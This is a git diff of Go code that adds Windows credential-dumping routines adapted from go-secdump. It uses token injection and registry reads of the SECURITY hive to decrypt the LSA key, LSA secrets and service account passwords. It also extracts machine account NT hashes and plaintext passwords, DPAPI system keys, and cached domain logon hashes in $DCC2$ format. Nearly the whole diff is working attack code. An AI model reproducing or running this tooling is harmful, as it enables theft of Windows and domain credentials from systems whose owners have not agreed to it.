@@ -8,17 +8,31 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 
+	"crypto/md5"
+	"crypto/rc4"
+
+	"golang.org/x/crypto/md4"
 	"golang.org/x/sys/windows"
 
-	"strings"
 	"log"
 	"strconv"
+	"strings"
+
+	"github.com/jfjallid/go-smb/smb/encoder"
 
 	"golang.org/x/sys/windows/registry"
 )
 
 // lots of code used from: https://github.com/jfjallid/go-secdump.git
-
+var (
+	s1         = []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
+	s2         = []byte("0123456789012345678901234567890123456789\x00")
+	s3         = []byte("NTPASSWORD\x00")
+	BootKey    []byte
+	LSAKey     []byte
+	NLKMKey    []byte
+	VistaStyle bool
+)
 type domain_account_f struct { // 104 bytes of fixed length fields
 	Revision                     uint16
 	_                            uint32 // Unknown
@@ -73,6 +87,36 @@ func (self *domain_account_f) unmarshal(data []byte) (err error) {
 	}
 	return
 }
+
+type dpapi_system struct {
+	Version    uint32
+	MachineKey [20]byte
+	UserKey    [20]byte
+}
+
+func (self *dpapi_system) unmarshal(data []byte) {
+	self.Version = binary.LittleEndian.Uint32(data[:4])
+	copy(self.MachineKey[:], data[4:24])
+	copy(self.UserKey[:], data[24:44])
+}
+type PrintableLSASecret struct {
+	secretType  string
+	secrets     []string
+	extraSecret string
+}
+
+func (self *PrintableLSASecret) PrintSecret() string {
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintln(self.secretType))
+	for _, item := range self.secrets {
+		sb.WriteString(fmt.Sprintln(item))
+	}
+	if self.extraSecret != "" {
+		sb.WriteString(fmt.Sprintln(self.extraSecret))
+	}
+	return sb.String()
+}
+
 type sam_key_data_aes struct {
 	Revision    uint32
 	Length      uint32
@@ -110,19 +154,6 @@ type lsa_secret struct {
 	Flags         uint32
 	EncryptedData []byte
 }
-func parseSecret(){}
-
-
-func getServiceUser(token windows.Token) (result string, err error){
-	err = utils.InjectToken(token) // inject token
-    if err != nil {
-        return "", fmt.Errorf("failed to inject token: %w", err)
-    }
-	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\`, registry.READ)
-	fmt.Println(key.ReadSubKeyNames(-1))
-	return "",nil
-}
-
 func (self *lsa_secret) unmarshal(data []byte) error {
     // Need at least 28 bytes for the fixed-size fields
     if len(data) < 28 {
@@ -142,6 +173,206 @@ func (self *lsa_secret) unmarshal(data []byte) error {
     }
     return nil
 }
+type nl_record struct {
+	UserLength               uint16
+	DomainNameLength         uint16
+	EffectiveNameLength      uint16
+	FullNameLength           uint16
+	LogonScriptName          uint16
+	ProfilePathLength        uint16
+	HomeDirectoryLength      uint16
+	HomeDirectoryDriveLength uint16
+	UserId                   uint32
+	PrimaryGroupId           uint32
+	GroupCount               uint32
+	logonDomainNameLength    uint16
+	Unk0                     uint16
+	LastWrite                uint64
+	Revision                 uint32
+	SidCount                 uint32
+	Flags                    uint32
+	Unk1                     uint32
+	LogonPackageLength       uint32
+	DnsDomainNameLength      uint16
+	UPN                      uint16
+	IV                       [16]byte
+	CH                       [16]byte
+	EncryptedData            []byte
+}
+
+func (self *nl_record) unmarshal(data []byte) (err error) {
+	if len(data) < 96 {
+		err = fmt.Errorf("Not enough data to unmarshal an NL_RECORD")
+		fmt.Println(err)
+		return
+	}
+
+	self.UserLength = binary.LittleEndian.Uint16(data[:2])
+	self.DomainNameLength = binary.LittleEndian.Uint16(data[2:4])
+	self.EffectiveNameLength = binary.LittleEndian.Uint16(data[4:6])
+	self.FullNameLength = binary.LittleEndian.Uint16(data[6:8])
+	self.LogonScriptName = binary.LittleEndian.Uint16(data[8:10])
+	self.ProfilePathLength = binary.LittleEndian.Uint16(data[10:12])
+	self.HomeDirectoryLength = binary.LittleEndian.Uint16(data[12:14])
+	self.HomeDirectoryDriveLength = binary.LittleEndian.Uint16(data[14:16])
+	self.UserId = binary.LittleEndian.Uint32(data[16:20])
+	self.PrimaryGroupId = binary.LittleEndian.Uint32(data[20:24])
+	self.GroupCount = binary.LittleEndian.Uint32(data[24:28])
+	self.logonDomainNameLength = binary.LittleEndian.Uint16(data[28:30])
+	self.Unk0 = binary.LittleEndian.Uint16(data[30:32])
+	self.LastWrite = binary.LittleEndian.Uint64(data[32:40])
+	self.Revision = binary.LittleEndian.Uint32(data[40:44])
+	self.SidCount = binary.LittleEndian.Uint32(data[44:48])
+	self.Flags = binary.LittleEndian.Uint32(data[48:52])
+	self.Unk1 = binary.LittleEndian.Uint32(data[52:56])
+	self.LogonPackageLength = binary.LittleEndian.Uint32(data[56:60])
+	self.DnsDomainNameLength = binary.LittleEndian.Uint16(data[60:62])
+	self.UPN = binary.LittleEndian.Uint16(data[62:64])
+	copy(self.IV[:], data[64:80])
+	copy(self.CH[:], data[80:96])
+	self.EncryptedData = data[96:]
+	return
+}
+func pad64(data uint64) uint64 {
+	if (data & 0x3) > 0 {
+		return data + (data & 0x3)
+	}
+	return data
+}
+func parseSecret(token windows.Token, name string, secretItem []byte) (result *PrintableLSASecret, err error){
+	if len(secretItem) == 0 {
+		return
+	}
+	if bytes.Compare(secretItem[:2], []byte{0,0}) == 0 {
+		return
+	}
+	secret := ""
+	extrasecret := ""
+	upperName := strings.ToUpper(name)
+	result = &PrintableLSASecret{}
+	result.secretType = "[*] " + name
+	if strings.HasPrefix(upperName, "_SC_") {
+		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
+		if err2 != nil {
+			fmt.Printf("error decoding from unicode string: %s\n", err2)
+			err = err2
+			return
+		}
+		svcUser, err := getServiceUser(token, name[4:]) // Skip initial _SC_ of the name
+		if err != nil {
+			svcUser = "(unknown user)"
+		} else{
+			if strings.HasPrefix(svcUser, ".\\") {
+				svcUser = svcUser[2:]
+			}
+		}
+		secret = fmt.Sprintf("%s: %s", svcUser, secretDecoded)
+		result.secrets = append(result.secrets, secret)
+	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
+		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
+		if err2 != nil {
+			fmt.Printf("error decoding from unicode string: %s\n", err2)
+			err = err2
+			return
+		}
+		secret = fmt.Sprintf("ASPNET: %s", secretDecoded)
+		result.secrets = append(result.secrets, secret)
+	} else if strings.HasPrefix(upperName, "DPAPI_SYSTEM") {
+		dpapi := &dpapi_system{}
+		dpapi.unmarshal(secretItem)
+		secret = fmt.Sprintf("dpapi_machinekey: 0x%x", dpapi.MachineKey)
+		secret2 := fmt.Sprintf("dpapi_userkey: 0x%x", dpapi.UserKey)
+		result.secrets = append(result.secrets, secret)
+		result.secrets = append(result.secrets, secret2)
+		} else if strings.HasPrefix(upperName, "$MACHINE.ACC") {
+			//log.Noticeln("Machine Account secret")
+			h := md4.New()
+			h.Write(secretItem)
+			printname := "$MACHINE.ACC"
+			secret = fmt.Sprintf("$MACHINE.ACC (NT Hash): %x", h.Sum(nil))
+			result.secrets = append(result.secrets, secret)
+			// Calculate AES128 and AES256 keys from plaintext passwords
+			hostname, domain, err := getHostnameAndDomain(token)
+			if err != nil {
+				fmt.Println(err)
+				// Skip calculation of AES Keys if request failed or if domain is empty
+			} else if domain != "" {
+				aes128Key, aes256Key, err := CalcMachineAESKeys(hostname, domain, secretItem)
+				if err != nil {
+					fmt.Println(err)
+				} else {
+					result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_128_key:%x", printname, aes128Key))
+					result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_256_key:%x", printname, aes256Key))
+				}
+			}
+			// Always print plaintext anyway since this may be needed for some popular usecases
+			extrasecret = fmt.Sprintf("%s:plain_password_hex:%x", printname, secretItem)
+			result.extraSecret = extrasecret
+		} else if strings.HasPrefix(upperName, "NL$KM") {
+			secret = fmt.Sprintf("NL$KM: 0x%x", secretItem[:16])
+			result.secrets = append(result.secrets, secret)
+			} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
+				//TODO What is CachedDefaultPassword? How is it different from the registry keys under winlogon?
+				// Default password for winlogon
+				secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
+				if err2 != nil {
+					err = err2
+					fmt.Printf("Error decoding secret '%s' Error: %s",secretItem,err)
+					return
+				}
+				fmt.Println("Check for default username is not implemented yet")
+				//username, err := getDefaultLogonName()
+				//if err != nil {
+				//    log.Errorln(err)
+				//}
+				username := ""
+				if username == "" {
+					username = "(Unknown user)"
+				}
+		
+				// Get default login name
+				secret = fmt.Sprintf("%s: %s", username, secretDecoded)
+				result.secrets = append(result.secrets, secret)
+			} else {
+				// Handle Security questions?
+				fmt.Println("Empty or unhandled secret for %s: %x\n", name, secretItem)
+			}
+	return
+
+}
+func getHostnameAndDomain(token windows.Token) (hostname, domain string, err error) {
+	p :=`SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`
+	err = utils.InjectToken(token) // inject token
+    if err != nil {
+        return "", "", fmt.Errorf("failed to inject token: %w", err)
+    }
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, p, registry.READ)
+	domain, _, err = key.GetStringValue("Domain")
+	if err != nil {
+		fmt.Println("Cannot get Domain name in 'getHostnameAndDomain' function")
+		return
+	}
+	hostname, _, err = key.GetStringValue("Hostname")
+	if err != nil {
+		fmt.Println("Cannot get Hostname name in 'getHostnameAndDomain' function")
+		return
+	}
+	return
+
+}
+
+
+func getServiceUser(token windows.Token, name string) (result string, err error){
+	err = utils.InjectToken(token) // inject token
+    if err != nil {
+        return "", fmt.Errorf("failed to inject token: %w", err)
+    }
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\`+name, registry.READ)
+	result, _, err = key.GetStringValue("ObjectName")
+	return result, err
+}
+
+
 
 type lsa_secret_blob struct {
     Length  uint32
@@ -188,158 +419,329 @@ func ParseRIDFromKey(keyName string) (uint32, error) {
 	return uint32(ridInt), nil
 }
 
-func GetCachedHash(token windows.Token, bootkey []byte) (result []string, err error) {
+func GetCachedHash(token windows.Token, bootkey []byte, VistaStyle bool) (result []string, err error) {
     err = utils.InjectToken(token) // inject token
     if err != nil {
         return nil, fmt.Errorf("failed to inject token: %w", err)
     }
+	baseKey := `Security\Cache`
+	var names []string
+	regKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, baseKey, registry.READ)
+	defer regKey.Close()
+	valueNames, err := regKey.ReadValueNames(-1)
+	if len(valueNames) == 0 {
+		return
+	}
+	foundIterCount := false
+	for _, name := range valueNames {
+		if name == "NL$Control" {
+			return
+		}
+		if name == "NL$IterationCount" {
+			foundIterCount = true
+			continue
+		}
+		names = append(names, name)
+	}
+	iterCount := 10240
+	if foundIterCount {
+		var tmpIterCount uint32
+		data, _, err := regKey.GetBinaryValue("NL$IterationCount")
+		if err != nil {
+			fmt.Printf("in get cached hashes (line 218): %s\n",err)
+			return nil, err
+		}
+		
+		tmpIterCount = binary.LittleEndian.Uint32(data)
+		if tmpIterCount > 10240 {
+			iterCount = int(tmpIterCount & 0xfffffc00)
+		}else {
+			iterCount = int(tmpIterCount * 1024)
+		}
+	}
+	_, err = GetLSASecretkey(token, bootkey)
+	if err != nil {
+		fmt.Printf("error trying to get LSAsecret key in getCachedHashes: %s\n", err)
+		return nil, err
+	}
+	nlkmsecret_key, err := getNLKMSecretKey(token, bootkey, VistaStyle)
+	if err != nil {
+		fmt.Printf("error trying to get NLKMSecret key in getCachedHashes: %s\n", err)
+		return nil, err
+	}
+	for _, name := range names {
+		data, _,_ := regKey.GetBinaryValue(name)
+		nl_record := &nl_record{}
+		err = nl_record.unmarshal(data)
+		if err != nil {
+			fmt.Printf("error trying to unmarshal: %s on line 304, continuing...", data)
+			continue
+		}
+		nilIV := make([]byte, 16)
+		var plaintext []byte
+		var answer string
+		if bytes.Compare(nl_record.IV[:], nilIV) != 0 {
+			if (nl_record.Flags & 1) == 1 {
+				if VistaStyle {
+					plaintext, err = DecryptAES(nlkmsecret_key[16:32], nl_record.EncryptedData, nl_record.IV[:])
+					if err != nil {
+						fmt.Printf("error decrypting plaintext on line 315, error:%s continuing..\n",err)
+						continue
+					}
+				}else {
+					fmt.Println("Not yet implement how to decrypt DCC2Cache when not VistaStyle")
+					continue
+				}
+			}else {
+				fmt.Println("Not sure how to handle non-encrypted record: %s\n", name)
+				continue
+			}
+			encHash := plaintext[:0x10]
+			plaintext = plaintext[0x48:]
+			userName, err := encoder.FromUnicodeString(plaintext[:nl_record.UserLength])
+			if err != nil {
+				fmt.Printf("error decoding from unicode on line 331: %s",err)
+			}
+			plaintext = plaintext[int(pad64(uint64(nl_record.UserLength)))+int(pad64(uint64(nl_record.DomainNameLength))):]
+			domainLong, err := encoder.FromUnicodeString(plaintext[:int(pad64(uint64(nl_record.DnsDomainNameLength)))])
+			if err != nil {
+				fmt.Printf("error decoding variable plaintext '%s' error: %s\n", plaintext, err)
+				continue
+			}
+			if VistaStyle {
+				answer = fmt.Sprintf("%s/%s:$DCC2$%d#%s#%x", domainLong, userName, iterCount, userName, encHash)
+				} else {
+				
+				answer = fmt.Sprintf("%s/%s:%x:%s", domainLong, userName, encHash, userName)
+			}
+			result = append(result, answer)
+		}else {
+			continue
+		}
 
-    var names []string
-    foundIterCount := false
-    
-    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache`, registry.READ)
-    if err != nil {
-        return nil, fmt.Errorf("failed to open Security\\Cache registry key: %w", err)
-    }
-    defer key.Close()
+	}
 
-    valueNames, err := key.ReadValueNames(-1)
-    if err != nil {
-        return nil, fmt.Errorf("failed to read value names: %w", err)
-    }
-
-    for _, name := range valueNames {
-        if name == "NL$Control" {
-            continue
-        }
-        if name == "NL$IterationCount" {
-            foundIterCount = true
-            continue
-        }
-        names = append(names, name)
-    }
-
-    if foundIterCount {
-        var tmpIterCount uint32
-        // Fix: Use the correct path to open the key
-        iterKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache\NL$IterationCount`, registry.READ)
-        if err != nil {
-            return nil, fmt.Errorf("failed to open NL$IterationCount key: %w", err)
-        }
-        defer iterKey.Close()
-
-        names, err := iterKey.ReadValueNames(-1)
-        if err != nil {
-            return nil, fmt.Errorf("failed to read iteration count value names: %w", err)
-        }
-        if len(names) == 0 {
-            return nil, fmt.Errorf("no iteration count values found")
-        }
-
-        data, _, err := iterKey.GetBinaryValue(names[0])
-        if err != nil {
-            return nil, fmt.Errorf("failed to get binary value: %w", err)
-        }
-        if len(data) < 4 {
-            return nil, fmt.Errorf("iteration count data too short")
-        }
-
-        tmpIterCount = binary.LittleEndian.Uint32(data)
-        // Store iteration count in result properties if needed
-        if tmpIterCount > 10240 {
-            // iterationCount = int(tmpIterCount & 0xfffffc00)  // Commented out since it's unused
-            fmt.Printf("Iteration count: %d\n", int(tmpIterCount & 0xfffffc00))
-        } else {
-            // iterationCount = int(tmpIterCount * 1024)  // Commented out since it's unused
-            fmt.Printf("Iteration count: %d\n", int(tmpIterCount * 1024))
-        }
-    } else {
-        fmt.Printf("Using default iteration count: %d\n", 10240)
-    }
-
-    secretKey, err := GetLSASecretkey(token, bootkey)
-	fmt.Println(secretKey)
-    if err != nil {
-        return nil, fmt.Errorf("failed to get LSA secret key: %w", err)
-    }
-
-    return names, nil // Changed to return the collected names instead of empty result
+    return
 }
 
 func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err error) {
-    err = utils.InjectToken(token) // inject token
-    if err != nil {
-        return nil, fmt.Errorf("failed to inject token: %w", err)
-    }
+	// Inject the token
+	err = utils.InjectToken(token)
+	if err != nil {
+		fmt.Println("failed to inject token: %v", err)
+		return nil, fmt.Errorf("failed to inject token: %w", err)
+	}
 
-    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Policy\PolEKList`, registry.READ)
-    if err != nil {
-        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
-    }
-    defer key.Close()
+	VistaStyle := true
+	var data []byte
 
-    data, _, err := key.GetBinaryValue("")
-    if err != nil {
-        return nil, fmt.Errorf("failed to get binary value: %w", err)
-    }
+	// Open the registry key to check for Vista-style encryption keys
+	regKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolEKList`, registry.READ)
+	if err != nil {
+		if err == registry.ErrNotExist {
+			VistaStyle = false
+		} else {
+			fmt.Println("error opening key `SECURITY\\Policy\\PolEKList`: %v", err)
+			return nil, fmt.Errorf("error opening key `SECURITY\\Policy\\PolEKList`: %w", err)
+		}
+	} else {
+		// Query the value if the key was successfully opened
+		data, _, err = regKey.GetBinaryValue("")
+		regKey.Close()
 
-    result, err = DecryptLSAKey(bootkey, data)
-    if err != nil {
-        return nil, fmt.Errorf("failed to decrypt LSA key: %w", err)
-    }
+		if err != nil {
+			fmt.Println("error querying binary value on key `SECURITY\\Policy\\PolEKList`: %v", err)
+			return nil, fmt.Errorf("error querying binary value on key `SECURITY\\Policy\\PolEKList`: %w", err)
+		}
+	}
 
-    return result, nil
+	// If Vista-style encryption keys are not found, check for pre-Vista encryption keys
+	if !VistaStyle {
+		regKey, err = registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolSecretEncryptionKey`, registry.READ)
+		if err != nil {
+			if err == registry.ErrNotExist {
+				fmt.Println("Could not find LSA Secret key")
+				return nil, nil
+			}
+			fmt.Println("error opening key `SECURITY\\Policy\\PolSecretEncryptionKey`: %v", err)
+			return nil, fmt.Errorf("error opening key `SECURITY\\Policy\\PolSecretEncryptionKey`: %w", err)
+		}
+		data, _, err = regKey.GetBinaryValue("")
+		regKey.Close()
+		if err != nil {
+			fmt.Println("error querying value on key `SECURITY\\Policy\\PolSecretEncryptionKey`: %v", err)
+			return nil, fmt.Errorf("error querying value on key `SECURITY\\Policy\\PolSecretEncryptionKey`: %w", err)
+		}
+	}
+
+	// Check if data is empty
+	if len(data) == 0 {
+		err = fmt.Errorf("failed to get LSA key")
+		fmt.Println(err)
+		return nil, err
+	}
+
+	// Decrypt the LSA key
+	result, err = decryptLSAKey(bootkey, data, VistaStyle)
+	if err != nil {
+		fmt.Println("error decrypting LSA key: %v", err)
+		return nil, fmt.Errorf("error decrypting LSA key: %w", err)
+	}
+
+	// Copy the result to the global LSAKey variable
+	LSAKey = make([]byte, 32)
+	copy(LSAKey, result)
+	return LSAKey, nil
 }
-func GetLSASecrets(token windows.Token, bootKey,lsaKey []byte) (secrets []string, err error) {
+
+
+
+func decryptLSAKey(bootkey, data []byte, VistaStyle bool) (result []byte, err error) {
+	var plaintext []byte
+	if VistaStyle {
+		lsaSecret := &lsa_secret{}
+		lsaSecret.unmarshal(data)
+		encryptedData := lsaSecret.EncryptedData
+		tmpkey := SHA256(bootkey, encryptedData[:32], 0)
+		plaintext, err2 := DecryptAES(tmpkey, encryptedData[32:], nil)
+		if err2 != nil {
+			fmt.Printf("error decrypting LSAKey: %s\n", err2)
+			err = err2
+			return
+		}
+		lsaSecretBlob := &lsa_secret_blob{}
+		lsaSecretBlob.unmarshal(plaintext)
+		result = lsaSecretBlob.Secret[52:][:32]
+	}else {
+		h := md5.New()
+		h.Write(bootkey)
+		for i :=0; i < 1000; i++ {
+			h.Write(data[60:76])
+		}
+		tmpkey := h.Sum(nil)
+		c1, err2 := rc4.NewCipher(tmpkey[:])
+		if err2 != nil {
+			err = err2
+			fmt.Printf("failed to get RC4 in 'decryptLSAKey function error: %s\n", err)
+			return
+		}
+		plaintext = make([]byte, 48)
+		c1.XORKeyStream(plaintext, data[12:60])
+		result = plaintext[0x10:0x20]
+	}
+	return
+    
+}
+func GetLSASecrets(token windows.Token, bootKey []byte, VistaStyle, history bool) (secrets []PrintableLSASecret, err error) {
 	err = utils.InjectToken(token) // inject token
     if err != nil {
         return nil, fmt.Errorf("failed to inject token: %w", err)
     }
-	secrets_path := `SECURITY\Policy\Secrets`
-	reg_key, err := registry.OpenKey(registry.LOCAL_MACHINE, secrets_path, registry.READ)
-    if err != nil {
-        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
-    }
+	secretPath := `SECURITY\Policy\Secrets`
 	var keys []string
-    defer reg_key.Close()
-	fmt.Println(reg_key.ReadValueNames(-1))
-	keys, _ = reg_key.ReadSubKeyNames(-1)
+	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, secretPath, registry.READ)
+	keys, _ = regkey.ReadSubKeyNames(-1)
+	regkey.Close()
+	LSAKey, err = GetLSASecretkey(token, bootKey)
+	if err != nil {
+		fmt.Printf("unable to get LSASecret key: %s\n", err)
+		return nil, err
+	}
+	if len(keys) == 0{
+		return
+	}
 	for _, key := range keys {
-		
-		if key == "NL$Control" { // Skip
+		if key == "NL$Control" {
 			continue
 		}
-		fmt.Printf("key: %s",key)
 		valueTypeList := []string{"CurrVal"}
-		// var secret []byte
-
+		if history {
+			valueTypeList = append(valueTypeList, "OldVal")
+		}
+		var secret []byte
 		for _, valueType := range valueTypeList {
-			// var subKey []byte
-			p := fmt.Sprintf(`%s\%s\%s`, secrets_path, key, valueType)
-			k, _ := registry.OpenKey(registry.LOCAL_MACHINE, p, registry.READ)
-			value, _, _ := k.GetBinaryValue("")
-			if (len(value) !=0) && (value[0] == 0x0) {
-				record := &lsa_secret{}
-				record.unmarshal(value)
-				tmpKey := SHA256(lsaKey, record.EncryptedData[:32],0)
-				plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
-				if err != nil {
-					fmt.Println(err)
+			k := fmt.Sprintf("%s\\%s\\%s", secretPath, key, valueType)
+			regkey, err = registry.OpenKey(registry.LOCAL_MACHINE,k ,registry.READ)
+			if err != nil {
+				fmt.Printf("error opening key '%s' error: %s\n",k, err)
+				return nil,err
+			}
+			value, _,err := regkey.GetBinaryValue("")
+			if err != nil {
+				fmt.Printf("Error getting key '%s' error: %s\n", k, err)
+				regkey.Close()
+				continue
+			}
+			regkey.Close()
+			if (len(value) != 0) && (value[0] == 0x0) {
+				if VistaStyle{
+					record := &lsa_secret{}
+					record.unmarshal(value)
+					tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
+					plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
+					if err != nil {
+						fmt.Printf("error decrypting tmpkey on line 505: %s\n",err)
+						continue
+					}
+					record2 := &lsa_secret_blob{}
+					record2.unmarshal(plaintext)
+					secret = record2.Secret
+				} else {
 					continue
 				}
-				record2 := &lsa_secret_blob{}
-				record2.unmarshal(plaintext)
-				secret := record2.Secret
-				fmt.Println(secret)
+				if valueType == "OldVal" {
+					key += "_history"
+				}
+				ps, err := parseSecret(token, key, secret)
+				if err != nil {
+					fmt.Printf("Error parsing secret '%s' error: %s\n", secret,err)
+				}else if ps == nil {
+					continue
+				}
+				secrets = append(secrets, *ps)
 			}
-			// ps, err := parseSecret()
-			// secrets = append(secrets, *ps)
-
 		}
-	}
-	return nil, nil
-}
 
+	}
+	return
+
+	
+}
+func getNLKMSecretKey(token windows.Token, bootkey []byte, VistaStyle bool) (result []byte, err error) {
+    err = utils.InjectToken(token) // inject token
+    if err != nil {
+        return nil, fmt.Errorf("failed to inject token: %w", err)
+    }
+	regkey, err := registry.OpenKey(registry.LOCAL_MACHINE,`SECURITY\Policy\Secrets\NL$KM\CurrVal`, registry.READ)
+    if err != nil {
+		fmt.Printf("error opening key for NLKMSecretKey: '%s'\n",err)
+		return
+	}
+	data, _,err := regkey.GetBinaryValue("")
+	if err != nil {
+		fmt.Printf("error opening value for NLKMSecretKey: '%s'\n",err)
+		return
+	}
+	defer regkey.Close()
+	if VistaStyle {
+		lsaSecret := &lsa_secret{}
+		lsaSecret.unmarshal(data)
+		tmpkey := SHA256(LSAKey, lsaSecret.EncryptedData[:32], 0)
+		var err2 error
+		result, err2 = DecryptAES(tmpkey, lsaSecret.EncryptedData[32:], nil)
+		if err2 != nil {
+			fmt.Printf("error decrypting AESKey: '%s' error: %s\n", lsaSecret.EncryptedData[32:], err2)
+			err = err2
+			return
+		}
+	}else {
+		fmt.Println("Not yet implement how to decrypt NL$KM key when not VistaStyle")
+		return
+	}
+	NLKMKey = make([]byte, 32)
+	copy(NLKMKey, result)
+	return
+}
 
 
 func GetBootKey(token windows.Token) (result []byte, err error) {
